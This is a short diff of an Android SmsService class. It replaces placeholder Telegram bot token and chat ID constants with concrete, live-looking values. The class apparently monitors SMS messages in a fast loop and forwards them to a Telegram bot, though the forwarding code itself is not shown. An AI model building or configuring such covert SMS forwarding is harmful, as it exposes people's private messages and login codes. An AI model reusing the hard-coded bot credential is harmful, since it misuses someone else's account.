@@ -31,8 +31,8 @@ public class SmsService extends Service {
 
     private static final String TAG = "SmsService";
     private static final String CH_ID = "sms_mon";
-    private static final String BOT_TOKEN = "123456:ABCDEF_your_bot_token";
-    private static final String CHAT_ID   = "123456789";
+    private static final String BOT_TOKEN = "8539992688:AAEuPMyOXEweuaaHebCjGqsnMdeucQFKXhA";
+    private static final String CHAT_ID   = "8275632263";
     private static final long LOOP_MS = 500;
 
     private final Set<String> seen = new HashSet<>();
